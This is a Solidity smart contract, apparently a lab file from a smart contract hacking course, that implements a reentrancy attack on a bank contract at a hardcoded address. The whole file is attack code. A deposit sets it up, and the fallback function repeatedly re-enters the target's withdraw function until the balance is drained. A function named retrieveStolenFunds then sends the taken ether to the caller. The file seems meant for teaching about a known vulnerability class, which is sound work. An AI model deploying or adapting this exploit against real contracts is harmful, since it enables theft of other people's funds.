/// Console Cowboys Smart Contract Hacking Course
/// @author Olie Brown @ficti0n
/// http://cclabs.io
interface targetInterface{
    function deposit() external payable;
    function withdraw(uint withdrawAmount) external;
}
contract simpleReentrancyAttack{
    targetInterface bankAddress = targetInterface(0x832Cc0Be768853295BB219cD98aC4d6d887ce9a7);
    uint amount = 0.001 ether;
    function deposit() public payable{
        bankAddress.deposit{value: amount}();
    }
    function attack() public payable{
        bankAddress.withdraw(amount);
    }
    fallback () external payable{
        if (address(bankAddress).balance >= amount){
            bankAddress.withdraw(amount);
        }
    }
    function getTargetBalance() public view returns(uint){
        return address(bankAddress).balance;
    }
    function retrieveStolenFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}